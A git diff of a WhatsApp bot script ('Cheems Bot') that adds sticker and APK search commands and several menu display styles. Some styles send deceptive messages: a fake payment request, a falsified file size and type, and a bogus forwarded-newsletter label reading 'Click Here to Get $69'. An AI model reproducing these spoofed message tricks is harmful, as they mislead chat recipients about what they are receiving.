+      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
+      video,
+      episode,
+    });
+    // Send the video with anime information as the caption
+    await XeonBotInc.sendMessage(m.chat, {video: {url: video}, caption: message},{quoted: m});
+  } catch (error) {
+    console.error("Error:", error);
+    replygcxeon("*Error: Could not track the anime or send the video.*");
+  }
+};
+break
+case 'stickersearch': {
+if (!text) return replygcxeon(`Example : ${m.prefix + command} kururmi`)
+var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
+var json = await js.json()
+replygcxeon(`
+❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
+
+💼 Title : ${json[0].title}
+🔗 Link : ${json[0].url}
+⭐ Total : ${json[0].total}
+`);
+}
+break
+case 'apksearch': {
+if (!text) return replygcxeon(`Example : ${prefix + command} whatsapp`)
+var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
+var json = await js.json()
+var capt = `
+❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
+    
+💼 Title : ${json[0].package}
+🔗 Link : ${json[0].url}
+👤 Develoepr : ${json[0].developer}
+⭐ Rating : ${json[0].rating}
+`;
+await XeonBotInc.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
+}
+break
+case 'readmore': {
+	let [l, r] = text.split`|`
+    if (!l) l = ''
+    if (!r) r = ''
+    XeonBotInc.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
+}
+break
   case 'totalfeature':
         case 'totalfitur': 
         case 'totalcmd': 
@@ -7086,7 +7662,7 @@ case 'blur':
             let xmenu_oh = `┌────────❖ 𝕮𝖍𝖊𝖊𝖒𝖘 𝕭𝖔𝖙 ❖────────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
-     │✑  ${xeonytimewisher} 😄
+    │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
 │
@@ -7122,139 +7698,34 @@ case 'blur':
 └┬──────────────────────── ⳹
    │✑  Please Type The *MENU*
    │✑  Given *BELOW*
-┌└───────────────────────┈ ⳹
-│❏${xprefix}𝐀𝐋𝐋𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐅𝐔𝐍𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐀𝐈𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐏𝐇𝐎𝐓𝐎𝐎𝐗𝐘𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐄𝐏𝐇𝐎𝐓𝐎𝟑𝟔𝟎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐌𝐀𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐍𝐒𝐅𝐖𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐕𝐈𝐃𝐄𝐎𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐒𝐓𝐀𝐋𝐊𝐄𝐑𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐁𝐔𝐆𝐌𝐄𝐍𝐔
-│❏${xprefix}𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
-└───────────────────────┈ ⳹
-
+  ┌└───────────────────────┈ ⳹
+  │❏${xprefix}𝐀𝐋𝐋𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐅𝐔𝐍𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐀𝐈𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐆𝐑𝐎𝐔𝐏𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐎𝐖𝐍𝐄𝐑𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐏𝐇𝐎𝐓𝐎𝐎𝐗𝐘𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐄𝐏𝐇𝐎𝐓𝐎𝟑𝟔𝟎𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐌𝐀𝐊𝐄𝐑𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐆𝐀𝐌𝐄𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐍𝐒𝐅𝐖𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐑𝐄𝐋𝐈𝐆𝐈𝐎𝐍𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐏𝐇𝐎𝐓𝐎𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐑𝐀𝐍𝐃𝐎𝐌𝐕𝐈𝐃𝐄𝐎𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐒𝐓𝐈𝐂𝐊𝐄𝐑𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐒𝐄𝐀𝐑𝐂𝐇𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐋𝐈𝐒𝐓𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐒𝐓𝐀𝐋𝐊𝐄𝐑𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐁𝐔𝐆𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐒𝐓𝐎𝐑𝐄𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐄𝐑𝐌𝐄𝐍𝐔
+  │❏${xprefix}𝐎𝐓𝐇𝐄𝐑𝐌𝐄𝐍𝐔
+  └───────────────────────┈ ⳹
+            
 > ░▒▓█►─═ ℭ𝔯𝔢𝔞𝔱𝔢𝔡 𝔅𝔶 𝔇𝔢𝔟𝔞𝔰𝔥𝔦𝔰 𝔇𝔢𝔶 ═─◄█▓▒░`
-if (typemenu === 'v1') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v2') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        text: xmenu_oh,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                }   if (typemenu === 'v3') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v4') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-                        caption: xmenu_oh,
-                        gifPlayback: true
-                    }, {
-                        quoted: m
-                    })
-                } else if (typemenu === 'v5') {
-                    XeonBotInc.relayMessage(m.chat, {
-                        scheduledCallCreationMessage: {
-                            callType: "VIDEO",
-                            scheduledTimestampMs: 1200,
-                            title: xmenu_oh
-                        }
-                    }, {})
-                } else if (typemenu === 'v6') {
-                    XeonBotInc.relayMessage(m.chat,  {
-                       requestPaymentMessage: {
-                          currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
-                          requestFrom: m.sender,
-                          noteMessage: {
-                             extendedTextMessage: {
-                                text: xmenu_oh,
-                                contextInfo: {
-                                   externalAdReply: {
-                                       showAdAttribution: true
-                                   }
-                                }
-                             }
-                          }
-                       }
-                    }, {})
-                } else if (typemenu === 'v7') {
-                    XeonBotInc.sendMessage(m.chat, {
-                        document: {
-                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
-                        },
-                        caption: xmenu_oh,
-                        mimetype: 'application/zip',
-                        fileName: ownername,
-                        fileLength: "99999999999",
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
-                                sourceUrl: websitex,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: fstatus 
-                    })
-                } else if (typemenu === 'v8') {
-                	XeonBotInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
-      gifPlayback: true,
-      caption: xmenu_oh,
-      contextInfo: {
-      externalAdReply: {
-      title: botname,
-      body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/523ffab349881f907099a.jpg',
-      sourceUrl: ``,
-      mediaType: 1,
-      renderLargerThumbnail: true
-      }
-      }
-      }, {
-                        quoted: m
-                    })
-                    }
-}
-break
-            case 'allmenu': {
-let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
@@ -7306,7 +7777,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7352,7 +7823,217 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
+      sourceUrl: ``,
+      mediaType: 1,
+      renderLargerThumbnail: true
+      }
+      }}, {
+                        quoted: m
+                    })
+      } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+    await XeonBotInc.sendMessage(m.chat, { react: { text: `📃`, key: m.key }})
+
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+            
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+                {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  },
+                  {
+                    "name": "reply",
+                    "buttonParamsJson": `{"display_text":"option 📃","id":"${prefix}othermenu"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+}
+}
+break
+            case 'allmenu': {
+let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+│ Hi 👋 
+└┬❖  ${pushname} 
+    │✑  ${xeonytimewisher} 😄
+┌┤✑ Use prefix ${prefix}
+│└────────────┈ ⳹
+│ ${allmenu(prefix, hituet)}`
+if (typemenu === 'v1') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v2') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: xmenu_oh,
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+                }   if (typemenu === 'v3') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v4') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+                        caption: xmenu_oh,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                } else if (typemenu === 'v5') {
+                    XeonBotInc.relayMessage(m.chat, {
+                        scheduledCallCreationMessage: {
+                            callType: "AUDIO",
+                            scheduledTimestampMs: 1200,
+                            title: xmenu_oh
+                        }
+                    }, {})
+                } else if (typemenu === 'v6') {
+                    XeonBotInc.relayMessage(m.chat,  {
+                       requestPaymentMessage: {
+                          currencyCodeIso4217: 'INR',
+                          amount1000: '9999999900',
+                          requestFrom: m.sender,
+                          noteMessage: {
+                             extendedTextMessage: {
+                                text: xmenu_oh,
+                                contextInfo: {
+                                   externalAdReply: {
+                                       showAdAttribution: true
+                                   }
+                                }
+                             }
+                          }
+                       }
+                    }, {})
+                } else if (typemenu === 'v7') {
+                    XeonBotInc.sendMessage(m.chat, {
+                        document: {
+                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
+                        },
+                        caption: xmenu_oh,
+                        mimetype: 'application/zip',
+                        fileName: ownername,
+                        fileLength: "99999999999",
+                        contextInfo: {
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                title: botname,
+                                body: ownername,
+                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
+                                sourceUrl: websitex,
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: fstatus 
+                    })
+                } else if (typemenu === 'v8') {
+                	XeonBotInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+      gifPlayback: true,
+      caption: xmenu_oh,
+      contextInfo: {
+      externalAdReply: {
+      title: botname,
+      body: ownername,
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7361,11 +8042,98 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+                {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner Menu👑","id":"${prefix}ownermenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
             case 'ownermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
     │✑  ${xeonytimewisher} 😄
@@ -7423,7 +8191,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7469,7 +8237,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7478,17 +8246,104 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'othermenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
 │ Hi 👋 
 └┬❖  ${pushname} 
     │✑  ${xeonytimewisher} 😄
 ┌┤✑ Use prefix ${prefix}
 │└────────────┈ ⳹
-│${othermenu(prefix, hituet)}`
+│ ${othermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
@@ -7540,7 +8395,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7586,7 +8441,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7595,18 +8450,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
+} else if (typemenu === 'v10') {
+let msg = generateWAMessageFromContent(from, {
+  viewOnceMessage: {
+    message: {
+        "messageContextInfo": {
+          "deviceListMetadata": {},
+          "deviceListMetadataVersion": 2
+        },
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          body: proto.Message.InteractiveMessage.Body.create({
+            text: ownername
+          }),
+          footer: proto.Message.InteractiveMessage.Footer.create({
+            text: botname
+          }),
+          header: proto.Message.InteractiveMessage.Header.create({
+            title: xmenu_oh,
+            subtitle: themeemoji,
+            hasMediaAttachment: false
+          }),
+          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+            buttons: [
+               {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"All Menu 📂","id":"${prefix}allmenu"}`
+    },
+                  {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Download Menu ⬇️","id":"${prefix}downloadmenu"}`
+    },
+                 {
+                    "name": "quick_reply",
+                                  "buttonParamsJson": `{"display_text":"  Game Menu 🎯","id":"${prefix}gamemenu"}`
+    },
+                  {
+                     "name": "quick_reply",
+                                     "buttonParamsJson": `{"display_text":" AI Menu 🤖","id":"${prefix}aimenu"}`
+    },
+                  {
+      "name": "cta_url",
+                     "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://wa.me/919339619072\",\"merchant_url\":\"https://www.google.com\"}"
+    },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
+                  },
+                  {
+                    "name": "quick_reply",
+                    "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
+                  }
+           ],
+          })
+        })
+    }
+  }
+}, {})
+
+await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
+  messageId: msg.key.id
+})
+
+}
 }
 break
 case 'downloadmenu': {
-let xmenu_oh = `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋❖────┐
-│ Hi 👋 
-└┬❖  ${pushname} 
-   │✑  ${xeonytimewisher} 😄
-┌┤✑ Use prefix ${prefix}
-│└────────────┈ ⳹
-│${downloadmenu(prefix, hituet)}`
-if (typemenu === 'v1') {
+    let xmenu_oh =  `┌────❖ 𝔻𝔻 ℂℍ𝔼𝔼𝕄𝕊 𝔹𝕆𝕋 ❖────┐
+    │ Hi 👋 
+    └┬❖  ${pushname} 
+        │✑  ${xeonytimewisher} 😄
+    ┌┤✑ Use prefix ${prefix}
+    │└────────────┈ ⳹
+    │ ${downloadmenu(prefix, hituet)}`
+    if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
@@ -7657,7 +8599,7 @@ if (typemenu === 'v1') {
                     XeonBotInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
-                          amount1000: '12345678900',
+                          amount1000: '9999999900',
                           requestFrom: m.sender,
                           noteMessage: {
                              extendedTextMessage: {
@@ -7703,7 +8645,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -7712,18 +8654,105 @@ if (typemenu === 'v1') {
       }, {
                         quoted: m
                     })
-                    }
+                    } else if (typemenu === 'v9') {
+                	XeonBotInc.sendMessage(m.chat, {
+video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
+caption: xmenu_oh,
+gifPlayback: true,
+contextInfo: {
+forwardingScore: 999,
+isForwarded: true,
+mentionedJid: [sender],
+forwardedNewsletterMessageInfo: {
+newsletterName: `Click Here to Get $69`,
+newsletterJid: "120363222395675670@newsletter",
+},
+externalAdReply: {
+showAdAttribution: true,
+title: ownername,
+body: botname,
+thumbnailUrl: "https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg",
+sourceUrl: websitex,
+mediaType: 1,
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m
+})
